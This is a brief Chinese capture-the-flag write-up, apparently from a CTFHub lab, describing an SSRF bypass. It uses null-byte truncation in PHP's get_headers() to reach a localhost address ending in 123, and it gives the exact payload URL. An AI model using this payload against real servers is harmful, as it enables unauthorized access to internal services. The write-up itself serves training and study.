![img](./assets/wps313.jpg)

bp抓包

![img](./assets/wps314.jpg) 

提示flag在本地，主机地址必须以123结尾

使用cve漏洞的零字符截断（%00）使get_headers()请求到本地127.0.0.1

![img](./assets/wps315.jpg) 

 

构造payload：

?url=http://127.0.0.123%00www.ctfhub.com

![img](./assets/wps316.jpg) 

 

 